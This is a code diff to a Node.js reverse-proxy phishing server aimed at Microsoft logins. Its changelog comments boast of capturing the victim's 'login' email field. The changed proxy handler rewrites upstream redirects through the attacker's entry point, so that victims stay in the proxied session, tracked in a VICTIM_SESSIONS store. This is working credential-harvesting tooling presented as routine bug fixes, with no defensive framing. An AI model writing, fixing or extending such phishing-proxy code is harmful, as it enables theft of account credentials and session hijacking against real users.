@@ -17,6 +17,7 @@
 // ✅ Email capture FIXED – now detects “login” field from Microsoft
 // ✅ Async callback FIXED – no more “await is only valid” crash
 // ✅ Entry point now served directly (no more JSON on root)
+// ✅ Redirect loop FIXED – rewrites redirects via proxy entry point
 // ============================================================
 
 const http = require("http");
@@ -1224,7 +1225,7 @@ async function handleDashboardAPI(req, res) {
 }
 
 // ============================================================
-// 🔧 PROXY HANDLER — UNIVERSAL QUERY‑STRING + ENTRY POINT
+// 🔧 PROXY HANDLER — REDIRECT LOOP FIX
 // ============================================================
 function proxyHandler(req, res) {
     proxyServer.emit('request', req, res);
@@ -1443,7 +1444,10 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                             port: locationURL.port || (locationURL.protocol === 'https:' ? 443 : 80),
                             host: locationURL.host
                         });
-                        proxyResponse.headers.location = location.replace(locationURL.host, headers.host);
+                        // 🔥 FIXED: Rewrite redirect to go through our proxy entry point
+                        const proxyUrl = new URL(`https://${headers.host}${PROXY_ENTRY_POINT}&${PHISHED_URL_PARAMETER}=${encodeURIComponent(location)}`);
+                        proxyResponse.headers.location = proxyUrl.toString();
+                        console.log(`[REDIRECT] Rewrote: ${location} -> ${proxyResponse.headers.location}`);
                     } catch (e) { VICTIM_SESSIONS[currentSession].path = location; }
                 }
 
